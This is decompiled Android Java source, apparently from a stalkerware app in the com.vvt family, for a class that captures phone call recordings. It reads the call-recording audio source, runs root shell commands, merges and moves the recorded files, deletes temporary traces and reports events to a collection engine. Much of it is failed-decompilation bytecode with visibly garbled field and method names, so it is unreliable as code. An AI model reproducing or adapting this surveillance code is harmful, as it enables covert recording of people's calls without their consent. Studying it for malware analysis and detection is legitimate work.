package com.vvt.capture.a;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.preference.b;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class l
  implements a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private Context c;
  private volatile boolean d;
  private String e;
  private RunningMode f;
  private k g;
  private b h;
  private com.vvt.base.a i;
  private String j;
  private String k;
  
  public l(Context paramContext, String paramString, RunningMode paramRunningMode, b paramb, com.vvt.base.a parama)
  {
    this.c = paramContext;
    this.h = paramb;
    this.i = parama;
    Object localObject = File.separator;
    boolean bool = paramString.endsWith((String)localObject);
    if (!bool)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      String str = File.separator;
      localObject = str;
    }
    for (this.e = ((String)localObject);; this.e = paramString)
    {
      bool = a;
      if (bool) {}
      bool = a;
      if (bool) {}
      this.f = paramRunningMode;
      return;
    }
  }
  
  private void a(String paramString)
  {
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localObject2 = FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    boolean bool = a;
    if (bool) {}
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    ((ArrayList)localObject2).add(localObject1);
    localObject1 = this.i;
    if (localObject1 != null)
    {
      localObject1 = this.i;
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
  }
  
  private void b(String paramString)
  {
    k localk = this.g;
    if (localk != null)
    {
      localk = this.g;
      localk.b(paramString);
    }
    for (;;)
    {
      return;
      boolean bool = a;
      if (!bool) {}
    }
  }
  
  private void c(String paramString)
  {
    k localk = this.g;
    if (localk != null)
    {
      localk = this.g;
      localk.a(paramString);
    }
    for (;;)
    {
      return;
      boolean bool = a;
      if (!bool) {}
    }
  }
  
  public void a() {}
  
  public void a(k paramk)
  {
    this.g = paramk;
  }
  
  /* Error */
  public void a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: getstatic 29	com/vvt/capture/a/l:a	Z
    //   5: istore 4
    //   7: iload 4
    //   9: ifeq +3 -> 12
    //   12: aload_0
    //   13: iload_3
    //   14: putfield 131	com/vvt/capture/a/l:d	Z
    //   17: aload_0
    //   18: getfield 41	com/vvt/capture/a/l:AppEngine1	Lcom/vvt/preference/removeFromPath;
    //   21: astore 5
    //   23: getstatic 137	com/vvt/preference/FxPreferenceType:CALL_RECORDING_AUDIO_SOURCE	Lcom/vvt/preference/FxPreferenceType;
    //   26: astore 6
    //   28: aload 5
    //   30: aload 6
    //   32: invokevirtual 142	com/vvt/preference/removeFromPath:a	(Lcom/vvt/preference/FxPreferenceType;)Lcom/vvt/preference/a;
    //   35: checkcast 144	com/vvt/preference/PrefCallRecordingAudioSource
    //   38: astore 5
    //   40: aload 5
    //   42: invokevirtual 148	com/vvt/preference/PrefCallRecordingAudioSource:getAudioSource	()I
    //   45: istore 4
    //   47: getstatic 29	com/vvt/capture/a/l:a	Z
    //   50: istore_3
    //   51: iload_3
    //   52: ifeq +3 -> 55
    //   55: aload_0
    //   56: aload_2
    //   57: putfield 71	com/vvt/capture/a/l:j	Ljava/lang/String;
    //   60: aload_0
    //   61: aload_1
    //   62: putfield 150	com/vvt/capture/a/l:k	Ljava/lang/String;
    //   65: aload_1
    //   66: aload_2
    //   67: invokestatic 155	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   70: pop
    //   71: getstatic 29	com/vvt/capture/a/l:a	Z
    //   74: istore_3
    //   75: iload_3
    //   76: ifeq +3 -> 79
    //   79: aload_0
    //   80: getfield 39	com/vvt/capture/a/l:MyUncaughtExceptionHandler	Landroid/content/Context;
    //   83: astore 6
    //   85: ldc -99
    //   87: astore 7
    //   89: aload 6
    //   91: aload 7
    //   93: invokestatic 162	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;)Z
    //   96: istore_3
    //   97: getstatic 29	com/vvt/capture/a/l:a	Z
    //   100: istore 8
    //   102: iload 8
    //   104: ifeq +3 -> 107
    //   107: iload_3
    //   108: ifne +132 -> 240
    //   111: getstatic 29	com/vvt/capture/a/l:a	Z
    //   114: istore_3
    //   115: iload_3
    //   116: ifeq +3 -> 119
    //   119: ldc -99
    //   121: astore 6
    //   123: aload 6
    //   125: invokestatic 166	com/vvt/shell/ShellUtil:AppEngine1	(Ljava/lang/String;)V
    //   128: getstatic 29	com/vvt/capture/a/l:a	Z
    //   131: istore_3
    //   132: iload_3
    //   133: ifeq +3 -> 136
    //   136: getstatic 170	com/vvt/m/a:MyUncaughtExceptionHandler	Ljava/lang/String;
    //   139: invokestatic 172	com/vvt/shell/ShellUtil:FxFileObserverWorker	(Ljava/lang/String;)V
    //   142: aload_0
    //   143: getfield 39	com/vvt/capture/a/l:MyUncaughtExceptionHandler	Landroid/content/Context;
    //   146: astore 6
    //   148: aload 6
    //   150: invokestatic 177	com/vvt/aa/removeFromPath:d	(Landroid/content/Context;)Z
    //   153: istore_3
    //   154: iload_3
    //   155: ifne +19 -> 174
    //   158: aload_0
    //   159: iconst_0
    //   160: putfield 131	com/vvt/capture/a/l:d	Z
    //   163: getstatic 29	com/vvt/capture/a/l:a	Z
    //   166: istore 4
    //   168: iload 4
    //   170: ifeq +3 -> 173
    //   173: return
    //   174: getstatic 29	com/vvt/capture/a/l:a	Z
    //   177: istore_3
    //   178: iload_3
    //   179: ifeq +3 -> 182
    //   182: aload_0
    //   183: getfield 39	com/vvt/capture/a/l:MyUncaughtExceptionHandler	Landroid/content/Context;
    //   186: astore 6
    //   188: ldc -99
    //   190: astore 7
    //   192: ldc -78
    //   194: istore 9
    //   196: aload 6
    //   198: aload 7
    //   200: iload 9
    //   202: invokestatic 182	com/vvt/ab/e:a	(Landroid/content/Context;Ljava/lang/String;I)Z
    //   205: pop
    //   206: aload_0
    //   207: getfield 39	com/vvt/capture/a/l:MyUncaughtExceptionHandler	Landroid/content/Context;
    //   210: astore 6
    //   212: aload 6
    //   214: invokestatic 177	com/vvt/aa/removeFromPath:d	(Landroid/content/Context;)Z
    //   217: istore_3
    //   218: iload_3
    //   219: ifne +21 -> 240
    //   222: aload_0
    //   223: iconst_0
    //   224: putfield 131	com/vvt/capture/a/l:d	Z
    //   227: getstatic 29	com/vvt/capture/a/l:a	Z
    //   230: istore 4
    //   232: iload 4
    //   234: ifeq -61 -> 173
    //   237: goto -64 -> 173
    //   240: ldc -72
    //   242: astore 6
    //   244: iconst_4
    //   245: istore 8
    //   247: iload 8
    //   249: anewarray 4	java/lang/Object
    //   252: astore 7
    //   254: iconst_0
    //   255: istore 9
    //   257: aconst_null
    //   258: astore 10
    //   260: ldc -69
    //   262: astore 11
    //   264: aload 7
    //   266: iconst_0
    //   267: aload 11
    //   269: aastore
    //   270: iconst_1
    //   271: istore 9
    //   273: aload 7
    //   275: iload 9
    //   277: aload_2
    //   278: aastore
    //   279: iconst_2
    //   280: istore 9
    //   282: iload 4
    //   284: invokestatic 194	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   287: astore 5
    //   289: aload 7
    //   291: iload 9
    //   293: aload 5
    //   295: aastore
    //   296: iconst_3
    //   297: istore 4
    //   299: iconst_1
    //   300: istore 9
    //   302: iload 9
    //   304: invokestatic 194	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   307: astore 10
    //   309: aload 7
    //   311: iload 4
    //   313: aload 10
    //   315: aastore
    //   316: aload 6
    //   318: aload 7
    //   320: invokestatic 199	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   323: astore 5
    //   325: invokestatic 204	com/vvt/shell/f:a	()Lcom/vvt/shell/f;
    //   328: astore 6
    //   330: aload 6
    //   332: aload 5
    //   334: invokevirtual 207	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   337: pop
    //   338: getstatic 29	com/vvt/capture/a/l:a	Z
    //   341: istore 4
    //   343: iload 4
    //   345: ifeq +3 -> 348
    //   348: aload 6
    //   350: invokevirtual 209	com/vvt/shell/f:d	()V
    //   353: getstatic 29	com/vvt/capture/a/l:a	Z
    //   356: istore 4
    //   358: iload 4
    //   360: ifeq +3 -> 363
    //   363: ldc -99
    //   365: astore 5
    //   367: aload 5
    //   369: invokestatic 211	com/vvt/shell/ShellUtil:j	(Ljava/lang/String;)V
    //   372: getstatic 29	com/vvt/capture/a/l:a	Z
    //   375: istore 4
    //   377: iload 4
    //   379: ifeq -206 -> 173
    //   382: goto -209 -> 173
    //   385: astore 5
    //   387: aload 6
    //   389: invokevirtual 209	com/vvt/shell/f:d	()V
    //   392: aload 5
    //   394: athrow
    //   395: astore 5
    //   397: aload_0
    //   398: iconst_0
    //   399: putfield 131	com/vvt/capture/a/l:d	Z
    //   402: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   405: istore 4
    //   407: iload 4
    //   409: ifeq -37 -> 372
    //   412: goto -40 -> 372
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	415	0	this	l
    //   0	415	1	paramString1	String
    //   0	415	2	paramString2	String
    //   1	218	3	bool1	boolean
    //   5	3	4	bool2	boolean
    //   45	1	4	m	int
    //   166	117	4	n	int
    //   297	15	4	i1	int
    //   341	67	4	bool3	boolean
    //   21	347	5	localObject1	Object
    //   385	8	5	localObject2	Object
    //   395	1	5	localException	Exception
    //   26	362	6	localObject3	Object
    //   87	232	7	localObject4	Object
    //   100	3	8	bool4	boolean
    //   245	3	8	i2	int
    //   194	109	9	i3	int
    //   258	56	10	localInteger	Integer
    //   262	6	11	str	String
    // Exception table:
    //   from	to	target	type
    //   332	338	385	finally
    //   338	341	385	finally
    //   247	252	395	java/lang/Exception
    //   267	270	395	java/lang/Exception
    //   277	279	395	java/lang/Exception
    //   282	287	395	java/lang/Exception
    //   293	296	395	java/lang/Exception
    //   302	307	395	java/lang/Exception
    //   313	316	395	java/lang/Exception
    //   318	323	395	java/lang/Exception
    //   325	328	395	java/lang/Exception
    //   348	353	395	java/lang/Exception
    //   353	356	395	java/lang/Exception
    //   367	372	395	java/lang/Exception
    //   387	392	395	java/lang/Exception
    //   392	395	395	java/lang/Exception
  }
  
  public void b() {}
  
  public void c()
  {
    boolean bool = a;
    if (bool) {}
    bool = e();
    if (bool)
    {
      bool = false;
      this.d = false;
      d();
    }
    for (;;)
    {
      return;
      bool = a;
      if (!bool) {}
    }
  }
  
  /* Error */
  public void d()
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_1
    //   2: iconst_0
    //   3: istore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: getstatic 29	com/vvt/capture/a/l:a	Z
    //   9: istore 4
    //   11: iload 4
    //   13: ifeq +3 -> 16
    //   16: ldc -37
    //   18: astore 5
    //   20: iconst_1
    //   21: istore 6
    //   23: iload 6
    //   25: anewarray 4	java/lang/Object
    //   28: astore 7
    //   30: iconst_0
    //   31: istore 8
    //   33: aconst_null
    //   34: astore 9
    //   36: ldc -35
    //   38: astore 10
    //   40: aload 7
    //   42: iconst_0
    //   43: aload 10
    //   45: aastore
    //   46: aload 5
    //   48: aload 7
    //   50: invokestatic 199	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   53: astore 5
    //   55: invokestatic 204	com/vvt/shell/f:a	()Lcom/vvt/shell/f;
    //   58: astore 7
    //   60: aload 7
    //   62: aload 5
    //   64: invokevirtual 207	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   67: pop
    //   68: getstatic 29	com/vvt/capture/a/l:a	Z
    //   71: istore 4
    //   73: iload 4
    //   75: ifeq +3 -> 78
    //   78: aload 7
    //   80: invokevirtual 209	com/vvt/shell/f:d	()V
    //   83: getstatic 29	com/vvt/capture/a/l:a	Z
    //   86: istore 4
    //   88: iload 4
    //   90: ifeq +3 -> 93
    //   93: ldc2_w 222
    //   96: lstore 11
    //   98: lload 11
    //   100: invokestatic 230	android/os/SystemClock:sleep	(J)V
    //   103: getstatic 232	com/vvt/m/a:d	Ljava/lang/String;
    //   106: astore 5
    //   108: ldc -22
    //   110: astore 7
    //   112: aload 5
    //   114: aload 7
    //   116: invokestatic 155	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   119: astore 5
    //   121: new 45	java/io/File
    //   124: astore 7
    //   126: aload 7
    //   128: aload 5
    //   130: invokespecial 236	java/io/File:<init>	(Ljava/lang/String;)V
    //   133: aload 7
    //   135: invokevirtual 239	java/io/File:exists	()Z
    //   138: istore 6
    //   140: iload 6
    //   142: ifeq +336 -> 478
    //   145: getstatic 29	com/vvt/capture/a/l:a	Z
    //   148: istore 6
    //   150: iload 6
    //   152: ifeq +3 -> 155
    //   155: iconst_0
    //   156: istore 6
    //   158: aconst_null
    //   159: astore 7
    //   161: aload_0
    //   162: iconst_0
    //   163: putfield 131	com/vvt/capture/a/l:d	Z
    //   166: aload_0
    //   167: getfield 122	com/vvt/capture/a/l:FxFileObserverWorker	Lcom/vvt/capture/a/k;
    //   170: astore 7
    //   172: aload 7
    //   174: ifnull +291 -> 465
    //   177: aload 5
    //   179: invokestatic 243	com/vvt/io/d:d	(Ljava/lang/String;)Ljava/lang/String;
    //   182: astore 5
    //   184: new 56	java/lang/StringBuilder
    //   187: astore 7
    //   189: aload 7
    //   191: invokespecial 57	java/lang/StringBuilder:<init>	()V
    //   194: ldc -11
    //   196: astore 9
    //   198: aload 7
    //   200: aload 9
    //   202: invokevirtual 61	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   205: astore 7
    //   207: aload 7
    //   209: aload 5
    //   211: invokevirtual 61	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   214: astore 5
    //   216: aload 5
    //   218: invokevirtual 65	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   221: astore 5
    //   223: aload_0
    //   224: getfield 122	com/vvt/capture/a/l:FxFileObserverWorker	Lcom/vvt/capture/a/k;
    //   227: astore 7
    //   229: aload 7
    //   231: aload 5
    //   233: invokeinterface 128 2 0
    //   238: aload_0
    //   239: aload 5
    //   241: invokespecial 246	com/vvt/capture/a/l:a	(Ljava/lang/String;)V
    //   244: aload_0
    //   245: getfield 69	com/vvt/capture/a/l:f	Lcom/vvt/base/RunningMode;
    //   248: astore 5
    //   250: getstatic 251	com/vvt/base/RunningMode:FULL	Lcom/vvt/base/RunningMode;
    //   253: astore 7
    //   255: aload 5
    //   257: aload 7
    //   259: if_acmpne +927 -> 1186
    //   262: new 253	com/vvt/j/MyUncaughtExceptionHandler
    //   265: astore 5
    //   267: aload 5
    //   269: invokespecial 254	com/vvt/j/MyUncaughtExceptionHandler:<init>	()V
    //   272: ldc_w 256
    //   275: astore 7
    //   277: aload_0
    //   278: getfield 67	com/vvt/capture/a/l:e	Ljava/lang/String;
    //   281: astore_3
    //   282: aload 5
    //   284: aload 7
    //   286: aload_3
    //   287: invokevirtual 257	com/vvt/j/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   290: astore 5
    //   292: getstatic 29	com/vvt/capture/a/l:a	Z
    //   295: istore 6
    //   297: iload 6
    //   299: ifeq +3 -> 302
    //   302: new 259	com/vvt/capture/a/e
    //   305: astore 7
    //   307: aload 7
    //   309: invokespecial 260	com/vvt/capture/a/e:<init>	()V
    //   312: aload 7
    //   314: aload 5
    //   316: invokevirtual 262	com/vvt/capture/a/e:a	(Ljava/lang/String;)Z
    //   319: istore 4
    //   321: iload 4
    //   323: ifeq +891 -> 1214
    //   326: ldc_w 264
    //   329: astore 5
    //   331: return
    //   332: astore 5
    //   334: aload 7
    //   336: invokevirtual 209	com/vvt/shell/f:d	()V
    //   339: aload 5
    //   341: athrow
    //   342: astore 5
    //   344: iconst_0
    //   345: istore 6
    //   347: aconst_null
    //   348: astore 7
    //   350: iconst_0
    //   351: istore 8
    //   353: aconst_null
    //   354: astore 9
    //   356: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   359: istore 13
    //   361: iload 13
    //   363: ifeq +3 -> 366
    //   366: aload 9
    //   368: invokestatic 267	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   371: istore 13
    //   373: iload 13
    //   375: ifne +795 -> 1170
    //   378: new 45	java/io/File
    //   381: astore 10
    //   383: aload 10
    //   385: aload 9
    //   387: invokespecial 236	java/io/File:<init>	(Ljava/lang/String;)V
    //   390: aload 10
    //   392: invokevirtual 270	java/io/File:delete	()Z
    //   395: pop
    //   396: getstatic 29	com/vvt/capture/a/l:a	Z
    //   399: istore 8
    //   401: iload 8
    //   403: ifeq +3 -> 406
    //   406: aload_3
    //   407: ifnull +19 -> 426
    //   410: aload_3
    //   411: invokevirtual 239	java/io/File:exists	()Z
    //   414: istore 8
    //   416: iload 8
    //   418: ifeq +8 -> 426
    //   421: aload_3
    //   422: invokevirtual 270	java/io/File:delete	()Z
    //   425: pop
    //   426: aload 7
    //   428: ifnull +742 -> 1170
    //   431: aload 7
    //   433: arraylength
    //   434: istore 8
    //   436: iconst_0
    //   437: istore_2
    //   438: aconst_null
    //   439: astore_3
    //   440: iload_2
    //   441: iload 8
    //   443: if_icmpge +727 -> 1170
    //   446: aload 7
    //   448: iload_2
    //   449: aaload
    //   450: astore 10
    //   452: aload 10
    //   454: invokevirtual 270	java/io/File:delete	()Z
    //   457: pop
    //   458: iload_2
    //   459: iconst_1
    //   460: iadd
    //   461: istore_2
    //   462: goto -22 -> 440
    //   465: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   468: istore 4
    //   470: iload 4
    //   472: ifeq -228 -> 244
    //   475: goto -231 -> 244
    //   478: new 45	java/io/File
    //   481: astore 5
    //   483: getstatic 232	com/vvt/m/a:d	Ljava/lang/String;
    //   486: astore 7
    //   488: aload 5
    //   490: aload 7
    //   492: invokespecial 236	java/io/File:<init>	(Ljava/lang/String;)V
    //   495: new 272	com/vvt/capture/a/m
    //   498: astore 7
    //   500: aload 7
    //   502: aload_0
    //   503: invokespecial 275	com/vvt/capture/a/m:<init>	(Lcom/vvt/capture/a/l;)V
    //   506: aload 5
    //   508: aload 7
    //   510: invokevirtual 279	java/io/File:listFiles	(Ljava/io/FilenameFilter;)[Ljava/io/File;
    //   513: astore 9
    //   515: aload 9
    //   517: ifnull +614 -> 1131
    //   520: aload 9
    //   522: arraylength
    //   523: istore 4
    //   525: iload 4
    //   527: ifle +604 -> 1131
    //   530: iconst_0
    //   531: istore 4
    //   533: aconst_null
    //   534: astore 5
    //   536: aload 9
    //   538: iconst_0
    //   539: aaload
    //   540: astore 5
    //   542: aload 5
    //   544: invokevirtual 282	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   547: astore 5
    //   549: iconst_0
    //   550: istore 6
    //   552: aconst_null
    //   553: astore 7
    //   555: aload 9
    //   557: iconst_0
    //   558: aaload
    //   559: astore 7
    //   561: aload 7
    //   563: invokevirtual 285	java/io/File:getName	()Ljava/lang/String;
    //   566: astore 14
    //   568: aload_0
    //   569: getfield 150	com/vvt/capture/a/l:k	Ljava/lang/String;
    //   572: astore 7
    //   574: aload 7
    //   576: aload 14
    //   578: invokestatic 155	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   581: astore 10
    //   583: aload 9
    //   585: arraylength
    //   586: istore 6
    //   588: iload 6
    //   590: iload_1
    //   591: if_icmple +268 -> 859
    //   594: aload_0
    //   595: getfield 67	com/vvt/capture/a/l:e	Ljava/lang/String;
    //   598: astore 7
    //   600: ldc_w 287
    //   603: astore 15
    //   605: aload 7
    //   607: aload 15
    //   609: invokestatic 155	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   612: astore 15
    //   614: new 289	java/lang/StringBuffer
    //   617: astore 16
    //   619: aload 16
    //   621: invokespecial 290	java/lang/StringBuffer:<init>	()V
    //   624: aload 9
    //   626: arraylength
    //   627: istore 17
    //   629: iconst_0
    //   630: istore 6
    //   632: aconst_null
    //   633: astore 7
    //   635: iload 6
    //   637: iload 17
    //   639: if_icmpge +60 -> 699
    //   642: aload 9
    //   644: iload 6
    //   646: aaload
    //   647: astore 18
    //   649: aload 18
    //   651: invokevirtual 282	java/io/File:getAbsolutePath	()Ljava/lang/String;
    //   654: astore 18
    //   656: aload 16
    //   658: aload 18
    //   660: invokevirtual 293	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   663: pop
    //   664: iload 17
    //   666: iconst_m1
    //   667: iadd
    //   668: istore 19
    //   670: iload 6
    //   672: iload 19
    //   674: if_icmpeq +16 -> 690
    //   677: ldc_w 295
    //   680: astore 18
    //   682: aload 16
    //   684: aload 18
    //   686: invokevirtual 293	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   689: pop
    //   690: iload 6
    //   692: iconst_1
    //   693: iadd
    //   694: istore 6
    //   696: goto -61 -> 635
    //   699: getstatic 232	com/vvt/m/a:d	Ljava/lang/String;
    //   702: astore 7
    //   704: new 56	java/lang/StringBuilder
    //   707: astore 20
    //   709: aload 20
    //   711: invokespecial 57	java/lang/StringBuilder:<init>	()V
    //   714: invokestatic 90	java/lang/System:currentTimeMillis	()J
    //   717: lstore 21
    //   719: aload 20
    //   721: lload 21
    //   723: invokevirtual 298	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   726: astore 20
    //   728: ldc_w 300
    //   731: astore 18
    //   733: aload 20
    //   735: aload 18
    //   737: invokevirtual 61	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   740: astore 20
    //   742: aload 20
    //   744: aload 14
    //   746: invokevirtual 61	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   749: astore 14
    //   751: aload 14
    //   753: invokevirtual 65	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   756: astore 14
    //   758: aload 7
    //   760: aload 14
    //   762: invokestatic 155	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   765: astore 5
    //   767: ldc_w 302
    //   770: astore 7
    //   772: iconst_3
    //   773: istore 23
    //   775: iload 23
    //   777: anewarray 4	java/lang/Object
    //   780: astore 14
    //   782: iconst_0
    //   783: istore 17
    //   785: aconst_null
    //   786: astore 20
    //   788: aload 14
    //   790: iconst_0
    //   791: aload 15
    //   793: aastore
    //   794: iconst_1
    //   795: istore_1
    //   796: aload 16
    //   798: invokevirtual 303	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   801: astore 16
    //   803: aload 14
    //   805: iload_1
    //   806: aload 16
    //   808: aastore
    //   809: iconst_2
    //   810: istore_1
    //   811: aload 14
    //   813: iload_1
    //   814: aload 5
    //   816: aastore
    //   817: aload 7
    //   819: aload 14
    //   821: invokestatic 199	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   824: astore 14
    //   826: invokestatic 305	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   829: astore 7
    //   831: aload 7
    //   833: aload 14
    //   835: invokevirtual 207	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   838: pop
    //   839: getstatic 29	com/vvt/capture/a/l:a	Z
    //   842: istore 23
    //   844: iload 23
    //   846: ifeq +3 -> 849
    //   849: aload 7
    //   851: ifnull +8 -> 859
    //   854: aload 7
    //   856: invokevirtual 209	com/vvt/shell/f:d	()V
    //   859: new 45	java/io/File
    //   862: astore 7
    //   864: aload 7
    //   866: aload 5
    //   868: invokespecial 236	java/io/File:<init>	(Ljava/lang/String;)V
    //   871: aload 7
    //   873: ifnull +176 -> 1049
    //   876: aload 7
    //   878: invokevirtual 239	java/io/File:exists	()Z
    //   881: istore_2
    //   882: iload_2
    //   883: ifeq +166 -> 1049
    //   886: aload 7
    //   888: invokevirtual 308	java/io/File:length	()J
    //   891: lstore 24
    //   893: lconst_0
    //   894: lstore 26
    //   896: lload 24
    //   898: lload 26
    //   900: lcmp
    //   901: istore_2
    //   902: iload_2
    //   903: ifle +146 -> 1049
    //   906: getstatic 29	com/vvt/capture/a/l:a	Z
    //   909: istore_2
    //   910: iload_2
    //   911: ifeq +3 -> 914
    //   914: aload 5
    //   916: aload 10
    //   918: invokestatic 311	com/vvt/shell/ShellUtil:a	(Ljava/lang/String;Ljava/lang/String;)V
    //   921: aload 7
    //   923: invokevirtual 270	java/io/File:delete	()Z
    //   926: pop
    //   927: aload 9
    //   929: arraylength
    //   930: istore_2
    //   931: iconst_0
    //   932: istore 4
    //   934: aconst_null
    //   935: astore 5
    //   937: iload 4
    //   939: iload_2
    //   940: if_icmpge +90 -> 1030
    //   943: aload 9
    //   945: iload 4
    //   947: aaload
    //   948: astore 14
    //   950: aload 14
    //   952: invokevirtual 270	java/io/File:delete	()Z
    //   955: pop
    //   956: iload 4
    //   958: iconst_1
    //   959: iadd
    //   960: istore 4
    //   962: goto -25 -> 937
    //   965: astore 7
    //   967: iconst_0
    //   968: istore 6
    //   970: aconst_null
    //   971: astore 7
    //   973: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   976: istore 23
    //   978: iload 23
    //   980: ifeq +3 -> 983
    //   983: aload 7
    //   985: ifnull -126 -> 859
    //   988: aload 7
    //   990: invokevirtual 209	com/vvt/shell/f:d	()V
    //   993: goto -134 -> 859
    //   996: astore 5
    //   998: aload 9
    //   1000: astore 7
    //   1002: aload 10
    //   1004: astore 9
    //   1006: goto -650 -> 356
    //   1009: astore 5
    //   1011: iconst_0
    //   1012: istore 6
    //   1014: aconst_null
    //   1015: astore 7
    //   1017: aload 7
    //   1019: ifnull +8 -> 1027
    //   1022: aload 7
    //   1024: invokevirtual 209	com/vvt/shell/f:d	()V
    //   1027: aload 5
    //   1029: athrow
    //   1030: aload_0
    //   1031: aload 10
    //   1033: invokespecial 312	com/vvt/capture/a/l:removeFromPath	(Ljava/lang/String;)V
    //   1036: getstatic 29	com/vvt/capture/a/l:a	Z
    //   1039: istore 4
    //   1041: iload 4
    //   1043: ifeq -799 -> 244
    //   1046: goto -802 -> 244
    //   1049: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   1052: istore 4
    //   1054: iload 4
    //   1056: ifeq +3 -> 1059
    //   1059: ldc_w 314
    //   1062: astore 5
    //   1064: aload_0
    //   1065: aload 5
    //   1067: invokespecial 316	com/vvt/capture/a/l:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   1070: aload 7
    //   1072: ifnull +21 -> 1093
    //   1075: aload 7
    //   1077: invokevirtual 239	java/io/File:exists	()Z
    //   1080: istore 4
    //   1082: iload 4
    //   1084: ifeq +9 -> 1093
    //   1087: aload 7
    //   1089: invokevirtual 270	java/io/File:delete	()Z
    //   1092: pop
    //   1093: aload 9
    //   1095: arraylength
    //   1096: istore_2
    //   1097: iconst_0
    //   1098: istore 4
    //   1100: aconst_null
    //   1101: astore 5
    //   1103: iload 4
    //   1105: iload_2
    //   1106: if_icmpge -862 -> 244
    //   1109: aload 9
    //   1111: iload 4
    //   1113: aaload
    //   1114: astore 14
    //   1116: aload 14
    //   1118: invokevirtual 270	java/io/File:delete	()Z
    //   1121: pop
    //   1122: iload 4
    //   1124: iconst_1
    //   1125: iadd
    //   1126: istore 4
    //   1128: goto -25 -> 1103
    //   1131: getstatic 33	com/vvt/capture/a/l:removeFromPath	Z
    //   1134: istore 4
    //   1136: iload 4
    //   1138: ifeq +3 -> 1141
    //   1141: ldc_w 314
    //   1144: astore 5
    //   1146: aload_0
    //   1147: aload 5
    //   1149: invokespecial 316	com/vvt/capture/a/l:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   1152: goto -908 -> 244
    //   1155: astore 5
    //   1157: aload 9
    //   1159: astore 7
    //   1161: iconst_0
    //   1162: istore 8
    //   1164: aconst_null
    //   1165: astore 9
    //   1167: goto -811 -> 356
    //   1170: aload 5
    //   1172: invokevirtual 319	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   1175: astore 5
    //   1177: aload_0
    //   1178: aload 5
    //   1180: invokespecial 316	com/vvt/capture/a/l:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   1183: goto -852 -> 331
    //   1186: new 253	com/vvt/j/MyUncaughtExceptionHandler
    //   1189: astore 5
    //   1191: aload 5
    //   1193: invokespecial 254	com/vvt/j/MyUncaughtExceptionHandler:<init>	()V
    //   1196: aload_0
    //   1197: getfield 39	com/vvt/capture/a/l:MyUncaughtExceptionHandler	Landroid/content/Context;
    //   1200: astore 7
    //   1202: aload 5
    //   1204: aload 7
    //   1206: invokevirtual 322	com/vvt/j/MyUncaughtExceptionHandler:a	(Landroid/content/Context;)Ljava/lang/String;
    //   1209: astore 5
    //   1211: goto -919 -> 292
    //   1214: ldc_w 324
    //   1217: astore 5
    //   1219: goto -888 -> 331
    //   1222: astore 5
    //   1224: aload 7
    //   1226: astore_3
    //   1227: aload 9
    //   1229: astore 7
    //   1231: aload 10
    //   1233: astore 9
    //   1235: goto -879 -> 356
